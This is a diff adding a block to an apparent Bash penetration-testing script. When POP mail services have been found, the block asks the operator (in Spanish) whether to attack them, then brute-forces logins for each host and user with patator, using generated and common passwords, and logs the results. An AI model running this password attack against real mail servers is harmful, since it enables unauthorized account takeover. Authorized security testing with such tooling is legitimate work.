@@ -279,6 +279,39 @@ then
 fi
 
 
+
+if [ -f .services/pop.txt ]
+then
+	echo -e "\n\t $OKBLUE Encontre servicios de POP activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+    then     			
+      echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? $RESET"	  
+	  read users_file  	  
+	  
+	  echo -e "$OKBLUE\n\t#################### Testing common pass POP (lennnto) ######################$RESET"	
+	  for line in $(cat .services/pop.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "\n\t########### $ip #######"	
+		for username in $(cat $users_file); do
+			echo -e "\n\t########### Testing user $username #######"			
+			echo $username > base.txt
+			passGen.sh -f base.txt -t top20 -o passwords2.txt
+			cat passwords2.txt top.txt | sort | uniq > passwords.txt
+			rm passwords2.txt
+			patator.py pop_login host=$ip user=$username password=FILE0 0=passwords.txt | tee -a logs/cracking/$ip-pop.txt	
+			#grep --color=never SUCCESS logs/cracking/$ip-pop.txt > vulnerabilities/$ip-pop-password.txt
+			echo ""			
+		done			
+		
+		echo ""			
+	 done
+	fi # if bruteforce
+fi
+	
+
 insert-data.py
 
 
